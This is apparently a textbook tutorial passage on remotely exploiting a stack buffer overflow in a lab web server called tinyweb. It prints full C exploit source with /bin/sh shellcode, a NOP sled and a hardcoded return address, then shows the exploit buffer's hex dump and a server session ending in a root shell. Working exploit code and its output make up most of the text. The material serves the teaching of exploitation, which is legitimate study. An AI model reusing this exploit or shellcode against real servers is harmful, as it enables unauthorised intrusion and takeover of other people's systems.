The following exploit for the tinyweb program uses the offset and return address overwrite values calculated with GDB
It fills the exploit buffer with null bytes, so anything written into it will automatically be null-terminated
Then it fills the first 500 bytes with NOP instructions
This builds the NOP sled and fills the buffer up to the return address overwrite location
Then the entire string is terminated with the '\r\n' line terminator

tinyweb_exploit.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "hacking.h"
#include "hacking-network.h"

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";  // standard shellcode

#define OFFSET 540
#define RETADDR 0xbffff688

int main(int argc, char *argv[]) {
   int sockfd, buflen;
   struct hostent *host_info;
   struct sockaddr_in target_addr;
   unsigned char buffer[600];

   if(argc < 2) {
      printf("Usage: %s <hostname>\n", argv[0]);
      exit(1);
   }

   if((host_info = gethostbyname(argv[1])) == NULL)
      fatal("looking up hostname");

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      fatal("in socket");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(80);
   target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
   memset(&(target_addr.sin_zero), '\0', 8); // Zero the rest of the struct

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server");

   bzero(buffer, 600);                      // zero out the buffer
   memset(buffer, '\x90', OFFSET);          // build a NOP sled
   *((u_int *)(buffer + OFFSET)) = RETADDR; // put the return address in
   memcpy(buffer+300, shellcode, strlen(shellcode)); // shellcode
   strcat(buffer, "\r\n");                  // terminate the string
   printf("Exploit buffer:\n");
   dump(buffer, strlen(buffer));  // show the exploit buffer               
   send_string(sockfd, buffer);   // send exploit buffer as a HTTP request

   exit(0);
}
__________________________________________________________________________________

When this program is compiled, it can remotely exploit hosts running the tinyweb program, tricking them into running the shellcode
The exploit also dumps the bytes of the exploit buffer before it sends it
In the output below, the tinyweb program is run in a different terminal, and the exploit is tested agains it
Here's the output from the hacker's terminal
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc tinyweb_exploit.c
reader@hacking:~/booksrc $ ./a.out 127.0.0.1
Exploit buffer:
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 31 c0 31 db | ............1.1. 
31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 2f 2f 73 68 | 1......j.XQh//sh 
68 2f 62 69 6e 89 e3 51 89 e2 53 89 e1 cd 80 90 | h/bin..Q..S..... 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................ 
0d 0a                                           | ..
__________________________________________________________________________________

Back on the terminal running the tinyweb program, the output shows the exploit buffer was received and the shellcode is executed
This will provide a rootshell, but only for the console running the server
Unfortunately, we aren't at the console, so this won't do us any good
At the server console, we see the following:
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./tinyweb
Accepting web requests on port 80
Got request from 127.0.0.1:53908 "GET / HTTP/1.1"
        Opening './webroot/index.html'   200 OK
Got request from 127.0.0.1:40668 "GET /image.jpg HTTP/1.1"
        Opening './webroot/image.jpg'    200 OK
Got request from 127.0.0.1:58504
"������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1���j                                                        XQh//shh/bin��Q��S ���������������������������������������������������������������������������������������������������������������������������������������������"
 NOT HTTP!
sh-3.2#
__________________________________________________________________________________

The vulnerability certainly exists, but the shellcode doesn't do what we want in this case
Since we're not at the console, shellcode is just a self-contained program, designed to take over another program to open a shell
Once control of the program's execution pointer is taken, the injected shellcode can do anything
There are many different types of shellcode that can be used in different situations (or payloads)
Even though not all shellcode actually spawns a shell, it's still commonly called shellcode